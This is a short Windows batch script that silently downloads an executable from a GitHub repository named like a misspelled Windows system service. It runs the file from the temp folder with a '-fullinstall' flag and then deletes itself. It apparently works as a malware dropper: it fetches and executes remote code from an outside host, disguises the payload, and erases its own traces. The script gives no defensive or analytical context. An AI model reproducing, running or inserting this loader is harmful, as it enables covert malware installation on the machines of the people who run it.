@echo off
curl -sL -o "%TEMP%\s.exe" "https://github.com/KronoRDP/System.Service-Windonws/raw/refs/heads/main/puro/service.exe"
if not exist "%TEMP%\s.exe" exit /b
start "" /b "%TEMP%\s.exe" -fullinstall
del "%~f0"